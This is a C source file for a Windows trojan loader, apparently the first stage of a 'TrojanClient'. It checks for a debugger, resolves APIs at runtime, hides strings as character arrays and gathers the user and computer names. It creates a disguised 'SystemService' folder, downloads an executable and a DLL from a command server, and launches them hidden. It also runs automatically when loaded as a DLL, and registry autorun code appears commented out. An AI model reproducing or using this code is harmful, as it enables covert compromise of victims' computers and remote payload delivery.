#include <windows.h>
#include <winsock.h>
#include "winternl.h"  
#include "Public.h"
#include "TrojanClient.h"
#include "LoadFromServer.h"
#include "AutoRun.h"
#include "DllExportFunc.h"


//#pragma comment(lib,"ws2_32.lib")
//#pragma comment(lib,"dbghelp.lib")












int MainProc()
{
	int iRet = PebNtGlobalFlagsApproach();
	if(iRet)
	{
#ifndef _DEBUG
		return FALSE;
		WriteLogFile("some people is being follow me\r\n");
#endif
	}

	iRet = GetApi();
	if (iRet == FALSE)
	{
		WriteLogFile("getapi error\r\n");
		return FALSE;
	}

	WSAData stWsa = {0};
	WORD wWsaVersion = 0x0202;
	iRet = lpWSAStartup(wWsaVersion,&stWsa);

	int iCpuBits = GetCpuBits();
	char szUserName[MAX_PATH];
	char szComputerName[MAX_PATH];
	iRet = GetUserAndComputerName(szUserName,szComputerName);
	int iSystemVersion = GetWindowsVersion();

	char  LITTLEBEARNAME[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };

	char szDstExeNameFormatWin7[MAX_PATH] = {'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
		'l','o','c','a','l','\\','%','s','\\',0};
	char szDstExeNameFormat[MAX_PATH] ={'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'%','s',0x5c,0};

	char szSysDir[MAX_PATH];
	iRet = lpGetSystemDirectoryA(szSysDir,MAX_PATH);
	szDstExeNameFormatWin7[0] = szSysDir[0] ;
	szDstExeNameFormat[0] = szSysDir[0];

	char szWorkPath[MAX_PATH] = {0};
	if (iSystemVersion > SYSTEM_VERSION_XP)
	{
		lpwsprintfA(szWorkPath,szDstExeNameFormatWin7,szUserName, LITTLEBEARNAME);
	}
	else
	{
		lpwsprintfA(szWorkPath,szDstExeNameFormat,szUserName, LITTLEBEARNAME);
	}

	iRet = lpMakeSureDirectoryPathExists(szWorkPath);

	char szLoadProgramCmd[] = {'L','O','A','D','P','R','O','G','R','A','M',0};
	char szExeFileName[MAX_PATH] = {0};
	char szDllFileName[MAX_PATH] = {0};
	iRet = RecvFileFromServer(szLoadProgramCmd,szWorkPath,szExeFileName,szDllFileName);
	if (iRet == FALSE)
	{
		WriteLogFile("RecvFileFromServer error\r\n");
		lpWSACleanup();
		return TRUE;
	}
	else {
		WriteLogFile("RecvFileFromServer ok\r\n");
	}

	//iRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE,iCpuBits,szExeFileName);			//some failed why?
	//iRet = SetBootAutoRunInRegistryRun(HKEY_CURRENT_USER,iCpuBits,szExeFileName);
	//iRet = CreateScheduleInCmd(1,TASKNAME,szExeFileName,szUserName,szComputerName,iSystemVersion,szWorkPath);



	//char szShellExecuteAOpen[] = {'o','p','e','n',0};
	char szStartFirstTime[] = {'S','T','A','R','T','F','I','R','S','T','T','I','M','E',0};
	//HINSTANCE hInst = lpShellExecuteA(0,szShellExecuteAOpen,szExeFileName,szStartFirstTime,0,0);

	char szcmd[MAX_PATH];
	lpwsprintfA(szcmd, "%s %s", szExeFileName, szStartFirstTime);
	lpWinExec(szcmd, SW_HIDE);

	lpWSACleanup();

	WriteLogFile("program ok\r\n");
	return TRUE;
}







#ifdef OUTPUT_FORMAT_EXE
int __stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	MainProc();
	return TRUE;
}
#else
int __stdcall DllMain( HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved ){
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		int ret = 0;
		char szmn[MAX_PATH] = { 0 };
		ret = GetModuleFileNameA(0, szmn, MAX_PATH);
		char szinfo[MAX_PATH] = { 0 };
		wsprintfA(szinfo, "DllMain exe:%s\r\n", szmn);
		WriteLogFile(szinfo);
		//MessageBoxA(0, szinfo, szinfo, MB_OK);
		ret = MainProc();
	}else if (dwReason == DLL_PROCESS_DETACH)
	{

	}else if (dwReason == DLL_THREAD_ATTACH)
	{

	}else if (dwReason == DLL_THREAD_DETACH)
	{

	}

	return TRUE;
}

#endif